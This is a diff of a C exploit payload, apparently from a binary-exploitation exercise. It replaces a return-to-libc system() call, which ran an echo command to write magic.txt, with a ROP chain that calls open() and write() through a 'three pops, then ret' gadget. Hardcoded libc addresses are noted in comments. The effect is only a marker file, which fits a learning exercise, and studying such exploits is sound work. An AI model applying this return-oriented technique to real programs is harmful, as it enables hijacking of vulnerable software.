@@ -23,45 +23,36 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* BELOW IS THE FIRST RETURN ADDRESS OVERWRITTEN */
 	/* ------------------------------------	*/
-	"\x40\x90\xE9\xB5"	// System Address
+	"\xF0\x5A\xF4\xB5"	// Open Address
+	"\xEE\x54\xFC\xB5"	// 3 Pops, then ret
+	"\xDE\xAD\xBE\xEF"	// Pointer to String
+	"\x01\x00\x00\x00"	// Flags
+	"\x00\x00\x00\x00"	// 0 (For read)
+
+	"\x10\x60\xF4\xB5"	// Write Address
+	"\xEE\x54\xFC\xB5"	// 3 Pops, then ret
+	"\x03\x00\x00\x00"	// File descriptor (3)
+	"\xDE\xAD\xBE\xEF"	// Pointer to String
+	"\x06\x00\x00\x00"	// 6 (The num of chars to write)
+
 	"\x40\x8D\xE8\xB5"	// Raise Address (return address of System)
-	"\x7C\xB6\xFF\xBF"	// Pointer to System's argument (on stack)
+	"\xDE\xAD\xBE\xEF"	// Stuff (hi I'm stuff)
 	"\x0C\x00\x00\x00"	// Raise's Argument
 
-	"\x20\x20\x20\x20"	// A shitload of whitespace to make it an easier target to hit
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
-	"\x20\x20\x20\x20"
+	// First string (magic.txt)
+	"\x6D\x61\x67\x69"
+	"\x63\x2E\x74\x78"
+	"\x74\x00\x00\x00"
 
-	"\x65\x63\x68\x6F"	// "echo"
-	"\x20\x2D\x6E\x20"	// " -n "
-	"\x78\x79\x7A\x7A"	// "xyzz"
-	"\x79\x21\x20\x3E"	// "y! >"
-	"\x20\x6D\x61\x67"	// " mag"
-	"\x69\x63\x2E\x74"	// "ic.t"
-	"\x78\x74\x00\x00"	// "xt\0\0"
+	// Second string (!xyzzy)
+	"\x21\x78\x79\x7A"
+	"\x7A\x79\x00\x00"
+	
 
 	/* USEFUL NOTES */
 	// 0xb5e710f0 is start address of libc text segment
-
+	// 16d4ee into libc we have 3 pops, followed by ret
+	// 0xb5fc54ee is the address of 3 pops, followed by ret
 ;
 
 int
